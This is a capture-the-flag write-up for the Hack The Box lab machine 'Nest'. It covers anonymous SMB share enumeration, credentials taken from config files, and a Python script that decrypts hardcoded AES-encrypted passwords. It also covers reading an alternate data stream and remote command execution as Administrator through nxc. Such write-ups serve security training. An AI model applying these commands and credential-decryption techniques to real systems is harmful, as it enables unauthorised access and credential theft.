# Nest: Easy

```sh
sudo vim /etc/hosts
# add nest.htb

nmap -T4 -p- -A -Pn -v nest.htb
```

* open ports & services:

    * 445/tcp: microsoft-ds
    * 4386/tcp: unknown

* the ```nmap``` scan is unable to detect the service running on port 4386/tcp, but the fingerprint output shows that it is a 'Reporting Service V1.2' app, and it allows to run some queries in the legacy 'HQK' format:

    * LIST
    * SETDIR <Directory_Name>
    * RUNQUERY <Query_ID>
    * DEBUG <Password>
    * HELP <Command>

* the webpage at 'http://nest.htb:4386/' is for 'HQK Reporting Service V1.2', and there are error messages saying 'Unrecognised command' and 'Session timed out'

* Googling about the HQK format does not give anything specific, so we can ignore that; similarly, searching for the service name and version info does not yield any results

* we can try interacting with the webpage using ```curl```:

    ```sh
    curl http://nest.htb:4386
    # gives error "Received HTTP/0.9 when not allowed"

    curl http://nest.htb:4386 --http0.9
    # this gives the error "Unrecognised command"
    ```

* the ```curl``` command shows a prompt, and it times out with "Session timed out" error if we do not enter anything

* we can try using ```curl``` and various request methods, but the webpage does not respond

* we can try checking with ```nc```:

    ```sh
    nc nest.htb 4386
    # we get a prompt
    # but entering anything leads nowhere
    ```

* ```nc``` also does not respond to any of the commands

* as it mentions a legacy service, we can try using ```telnet```:

    ```sh
    telnet nest.htb 4386
    # this works

    LIST
    # shows a few query IDs
    # current directory - 'ALL QUERIES'

    HELP LIST
    # mentions other commands RUNQUERY, SHOWQUERY, SETDIR

    HELP RUNQUERY

    HELP SHOWQUERY

    HELP SETDIR

    HELP DEBUG

    SHOWQUERY 1
    # "debug mode must be enabled to run this command"

    RUNQUERY 1
    # "invalid database configuration found"

    SETDIR ..
    # this sets current directory to "HQK"

    LIST
    # check all files

    DEBUG welcome2019
    # "invalid password entered"
    ```

    * the ```LIST``` command shows query ID numbers, and we have options to run query IDs, and set directories

    * we can use the ```HELP``` command to know more about each command

    * the ```SETDIR``` command can be used to change directories, and ```..``` can also be used to go back a directory

    * the ```DEBUG``` command looks interesting as it is supposed to allow use of additional commands: but it requires a password

    * we can try using the other commands like ```RUNQUERY``` and ```SHOWQUERY```, but they don't work

    * if we run ```SETDIR ..```, we move to the 'HQK' directory: and then using ```LIST```, we get a different list of files and folders, including possible config files

    * we can try to read the files, but it requires debug mode to be enabled

    * trying to enable debug mode with the previous password as well as other common creds fail

    * we can try enumerating the directory structure using ```SETDIR``` - we can check the other directories on the Windows box this way, but it does not lead to any secrets since we cannot read the files

* we can enumerate the SMB service next for any clues:

    ```sh
    smbclient -N -L //nest.htb
    # we have some non-default shares

    smbclient //nest.htb/Secure$
    # anonymous login works

    dir
    # 'NT_STATUS_ACCESS_DENIED'

    exit

    # check the other shares

    smbclient //nest.htb/Users
    # anonymous login

    dir
    # we have folders for different users
    # but further listing gives the same error as before

    exit

    smbclient //nest.htb/Data
    # anonymous login works

    dir
    # check all folders

    cd Shared

    dir
    # this is the only folder we can list

    cd Maintenance

    get "Maintenance Alerts.txt"
    # fetch the file

    cd ..

    cd Templates

    dir

    cd HR

    get "Welcome Email.txt"
    ```

* the SMB service reveals a few non-default shares: which gives us the following findings:

    * the 'Users' share discloses the following usernames: 'Administrator', 'C.Smith', 'L.Frost', 'R.Thompson', 'TempUser'

    * the 'Data' share has a few subfolders: 'IT', 'Production', 'Reports', 'Shared': but only 'Shared' folder seems to be accessible

    * this 'Shared' folder contains a couple of directories: 'Maintenance' and 'Templates': where the former contains a text file

    * the 'Templates' subfolder contains a couple more folders: 'HR' & 'Marketing': where the former contains another text file

* check the text files for any info:

    ```sh
    cat Maintenance\ Alerts.txt
    # no info

    cat Welcome\ Email.txt
    # this gives us creds
    ```

* one of the text files discloses the creds 'TempUser:welcome2019', and also mentions the home folder location ```\\HTB-NEST\Users\TempUser``` - which is the SMB share folder found earlier

* we can check if this folder has anything:

    ```sh
    smbclient //nest.htb/Users -U TempUser
    # the creds work

    cd TempUser

    dir
    # there is a single empty file "New Text Document.txt"
    ```

* similarly, we can check the other shares:

    ```sh
    smbclient //nest.htb/Secure$ -U TempUser
    # the creds work

    dir
    # check subfolders
    # but we get error "NT_STATUS_ACCESS_DENIED"

    exit

    smbclient //nest.htb/Data -U TempUser
    
    dir
    # check all folders

    cd IT
    # multiple sub-folders

    cd Configs
    # multiple app-related folders

    cd Adobe

    dir

    mget *
    # fetch all files
    
    # similarly, check all other folders
    ```

* from the 'Data' share, we get multiple files of interest: we can check all the config files fetched from the share folders

* one of the files 'RU_config.xml', fetched from the 'RU Scanner' folder, contains the creds 'c.smith:fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=' for port 389: but the password seems to be encrypted

* similarly, the 'config.xml' file discloses a few file paths in the history section at the bottom:

    * ```C:\windows\System32\drivers\etc\hosts```
    * ```\\HTB-NEST\Secure$\IT\Carl\Temp.txt```
    * ```C:\Users\C.Smith\Desktop\todo.txt```

* while we cannot list any of the folders in the 'Secure$' share, we can try to check if we can navigate to the mentioned sub-folders:

    ```sh
    smbclient //nest.htb/Secure$ -U TempUser

    cd IT

    cd Carl

    dir
    # this works
    # we have a few folders here

    cd Docs

    dir

    get ip.txt

    get mmc.txt

    cd ..

    cd "VB Projects"

    dir

    cd WIP

    dir

    cd RU

    dir

    cd RUScanner
    # VB Project files
    ```

* checking the share path ```\\HTB-NEST\Secure$\IT\Carl\VB Projects\WIP\RU\RUScanner```, we have several Visual Basic files

* to effectively view and copy the entire directory over to the attacker, we can mount the directory and check further:

    ```sh
    sudo mkdir /mnt/VB

    sudo mount -t cifs -o username=TempUser,password=welcome2019,domain=. //10.129.184.136/Secure$/IT/Carl /mnt/VB
    # mount the target share folder to '/mnt/VB'
    ```

* after mounting the nested share folder, we can open the folder view GUI

* after navigating to the subfolder ```/VB Projects/WIP/RU``` inside the mounted share folder, we can copy the entire 'RU' directory to our system

* then, we can unmount the share using ```sudo umount /mnt/VB```

* checking the Visual Basic project for 'RUScanner', we can see there is encryption/decryption logic in the file 'Utils.vb':

    ```vb
    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function EncryptString(PlainString As String) As String
        If String.IsNullOrEmpty(PlainString) Then
            Return String.Empty
        Else
            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Encrypt(ByVal plainText As String, _
                                ByVal passPhrase As String, _
                                ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                ByVal initVector As String, _
                                ByVal keySize As Integer) _
                        As String
        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                        saltValueBytes, _
                                        passwordIterations)
        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Using memoryStream As New IO.MemoryStream()
            Using cryptoStream As New CryptoStream(memoryStream, _
                                            encryptor, _
                                            CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                Dim cipherTextBytes As Byte() = memoryStream.ToArray()
                memoryStream.Close()
                cryptoStream.Close()
                Return Convert.ToBase64String(cipherTextBytes)
            End Using
        End Using
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                ByVal passPhrase As String, _
                                ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                ByVal initVector As String, _
                                ByVal keySize As Integer) _
                        As String
        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)
        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                        saltValueBytes, _
                                        passwordIterations)
        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)
        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)
        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)
        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                            0, _
                                            plainTextBytes.Length)
        memoryStream.Close()
        cryptoStream.Close()
        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)
        Return plainText
    End Function
    ```

* we can use ChatGPT to understand the encryption/decryption steps implemented in this VB project:

    * the encrypt/decrypt functions take the following hardcoded values:

        * plaintext/ciphertext
        * passphrase: "N3st22"
        * salt: "88552299"
        * password iterations: 2
        * initialization vector: "464R5DFA5DL6LE28"
        * key size: 256
    
    * the encryption function has the following steps:

        * ASCII-to-byte encoding
        * PBKDF2 to get AES key from password+salt
        * AES-CBC encryption using key and IV
        * Base64 encoding of encrypted bytes
    
    * similarly, the decryption flow has the following steps:

        * Base64 decoding
        * PBKDF2 to get same AES key from password+salt
        * AES-CBC decryption using key and IV
        * byte-to-ASCII decoding

* we can try to create a Python script that does the decryption, using ChatGPT:

    ```py
    import base64
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA1
    from Crypto.Util.Padding import unpad

    # Hardcoded values from the VB.NET code
    PASS_PHRASE = "N3st22"
    SALT = "88552299"
    ITERATIONS = 2
    INIT_VECTOR = "464R5DFA5DL6LE28"
    KEY_SIZE = 32  # 256 bits = 32 bytes

    def decrypt(ciphertext_b64: str) -> str:
        # Convert Base64 ciphertext to raw bytes
        cipher_bytes = base64.b64decode(ciphertext_b64)

        # Derive AES key using PBKDF2-HMAC-SHA1
        key = PBKDF2(
            password=PASS_PHRASE,
            salt=SALT.encode("ascii"),
            dkLen=KEY_SIZE,
            count=ITERATIONS,
            hmac_hash_module=SHA1
        )

        # IV must be exactly 16 bytes
        iv = INIT_VECTOR.encode("ascii")

        # Create AES-CBC cipher
        cipher = AES.new(key, AES.MODE_CBC, iv)

        # Decrypt
        decrypted = cipher.decrypt(cipher_bytes)

        # Remove PKCS#7 padding
        plaintext = unpad(decrypted, AES.block_size)

        # Convert bytes to ASCII string
        return plaintext.decode("ascii")

    if __name__ == "__main__":
        encrypted = input("Enter Base64 ciphertext: ").strip()

        try:
            decrypted_text = decrypt(encrypted)
            print("\n[+] Decrypted plaintext:")
            print(decrypted_text)

        except Exception as e:
            print(f"\n[-] Decryption failed: {e}")
    ```

    ```sh
    vim decrypt.py

    python3 decrypt.py
    # enter the ciphertext 'fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE='
    # this gives the plaintext
    ```

* using the Python script, we get the plaintext 'xRxRxPANCAK3SxRxRx': we can use this as the password for 'c.smith' user now

* we can try using this password in the ```DEBUG``` mode on the reporting service, but it fails

* we can use the creds to check the 'Users' share as 'c.smith':

    ```sh
    smbclient //nest.htb/Users -U c.smith

    dir

    cd c.smith

    dir

    get user.txt
    # user flag

    cd "HQK Reporting"

    dir

    get "Debug Mode Password.txt"
    # empty file

    # check if there is any alternate data stream hidden
    allinfo "Debug Mode Password.txt"
    # this shows there is another stream for 'Password'

    more "Debug Mode Password.txt:Password"
    # read the ADS
    # this gives a password

    get HQK_Config_Backup.xml

    cd "AD Integration Module"

    dir

    get HqkLdap.exe

    exit
    ```

* from the home directory of 'c.smith' user, we have a couple of files of interest: but they do not give any interesting data

* however, one of the files, which is empty on first glance, actually has an alternate data stream that is revealed using the ```allinfo``` command in ```smbclient```

* the 'Debug Mode Password.txt' file has an ADS for 'Password': if we read it, we get the password 'WBQ201953D8w'

* we can now use the ```DEBUG``` mode:

    ```sh
    telnet nest.htb 4386

    DEBUG WBQ201953D8w
    # this works
    # we have additional commands now

    HELP

    HELP SESSION

    HELP SERVICE

    SESSION
    # gives info about current session

    SERVICE
    # gives info about current service
    # no useful info

    # we can try using the SHOWQUERY & RUNQUERY commands

    SHOWQUERY 1
    # lists the query, no useful info
    # we can check other queries

    RUNQUERY 1
    # this does not work

    SETDIR ..

    LIST
    # we have a few files here
    # we can check if these can be printed using 'SHOWQUERY'

    SHOWQUERY 1
    # it fails for '.exe' files

    SHOWQUERY 2

    SHOWQUERY 3
    # the 'SHOWQUERY' commands work for XML files

    # check other directories

    SETDIR LDAP

    LIST
    # we have a conf file here

    SHOWQUERY 2
    # this prints Administrator password
    ```

* interacting with the service after enabling the ```DEBUG``` functionality, we can see that the ```SHOWQUERY``` command works only for certain types of files

* checking in each directory for which files can be printed, we find a 'LDAP' directory that contains a 'Ldap.conf' file

* if we try to read it using the ```SHOWQUERY``` command, we get the encrypted password for 'Administrator': 'yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4='

* this seems to be encrypted in the same manner as the previous password: we can try decoding it using the same script:

    ```sh
    python3 decrypt.py
    # this fails
    ```

* we are unable to decrypt the password using the same decrypt function as earlier

* however, as the file for the password is named 'Ldap.conf', and the user share for 'C.smith' contained an executable 'HqkLdap.exe', we can try looking further into the application if it contains any secrets

* in order to debug the EXE, we can use an application like [dnSpy](https://github.com/dnSpy/dnSpy): this natively runs on Windows, so we can transfer the 'HqkLdap.exe' file from attacker to a Windows VM

* we can open the EXE in dnSpy, and expand the code files for any info on the encryption/decryption part

* checking the different files, we have a 'CR' class for the EXE, which includes the following decompiled code on the encryption/decryption of the password:

    ```cs
	public class CR
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00002278 File Offset: 0x00000678
		public static string DS(string EncryptedString)
		{
			if (string.IsNullOrEmpty(EncryptedString))
			{
				return string.Empty;
			}
			return CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000022B0 File Offset: 0x000006B0
		public static string ES(string PlainString)
		{
			if (string.IsNullOrEmpty(PlainString))
			{
				return string.Empty;
			}
			return CR.RE(PlainString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000022E8 File Offset: 0x000006E8
		private static string RE(string plainText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(initVector);
			byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
			byte[] bytes3 = Encoding.ASCII.GetBytes(plainText);
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations);
			byte[] bytes4 = rfc2898DeriveBytes.GetBytes(checked((int)Math.Round((double)keySize / 8.0)));
			ICryptoTransform transform = new AesCryptoServiceProvider
			{
				Mode = CipherMode.CBC
			}.CreateEncryptor(bytes4, bytes);
			string result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytes3, 0, bytes3.Length);
					cryptoStream.FlushFinalBlock();
					byte[] inArray = memoryStream.ToArray();
					memoryStream.Close();
					cryptoStream.Close();
					result = Convert.ToBase64String(inArray);
				}
			}
			return result;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000023DC File Offset: 0x000007DC
		private static string RD(string cipherText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(initVector);
			byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
			byte[] array = Convert.FromBase64String(cipherText);
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations);
			checked
			{
				byte[] bytes3 = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)keySize / 8.0));
				ICryptoTransform transform = new AesCryptoServiceProvider
				{
					Mode = CipherMode.CBC
				}.CreateDecryptor(bytes3, bytes);
				MemoryStream memoryStream = new MemoryStream(array);
				CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
				byte[] array2 = new byte[array.Length + 1];
				int count = cryptoStream.Read(array2, 0, array2.Length);
				memoryStream.Close();
				cryptoStream.Close();
				return Encoding.ASCII.GetString(array2, 0, count);
			}
		}

		// Token: 0x04000006 RID: 6
		private const string K = "667912";

		// Token: 0x04000007 RID: 7
		private const string I = "1L1SA61493DRV53Z";

		// Token: 0x04000008 RID: 8
		private const string SA = "1313Rf99";
	}
    ```

* checking the core logic of the encryption/decryption class, we can see that the code follows the same functionality, but the hardcoded values have changed this time:

    * passphrase: "667912"
    * salt: "1313Rf99"
    * password iterations: 3
    * initialization vector: "1L1SA61493DRV53Z"
    * key size: 256

* the rest of the processing of values is the same, so we can make these modifications accordingly to the previous decryption Python script to decode the password:

    ```sh
    cp decrypt.py decrypt2.py

    vim decrypt2.py
    # change the hardcoded values to the new ones

    python3 decrypt2.py
    # use the admin encrypted password
    # this works
    ```

* the decryption script works and we get the plaintext 'XtH4nkS4Pl4y1nGX'

* we can now log into the Administrator users share to get the flag:

    ```sh
    smbclient //nest.htb/Users -U Administrator
    # the password works

    cd Administrator

    dir
    # we have a shortcut link to the flag here
    # this cannot be viewed to get the flag
    ```

* we can try using the creds for SMB command execution instead via ```nxc```:

    ```sh
    nxc smb nest.htb -u Administrator -p XtH4nkS4Pl4y1nGX -x 'type C:\Users\Administrator\Desktop\root.txt' --exec-method smbexec
    # this works
    # we get root flag
    ```
